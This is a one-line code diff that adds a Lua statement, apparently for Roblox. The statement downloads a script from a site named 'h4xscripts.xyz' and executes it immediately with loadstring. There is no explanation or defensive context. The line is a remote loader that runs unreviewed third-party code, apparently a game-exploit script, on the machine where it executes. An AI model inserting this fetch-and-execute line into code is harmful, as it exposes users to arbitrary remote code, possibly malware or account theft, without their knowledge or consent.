@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://h4xscripts.xyz/loader"))()
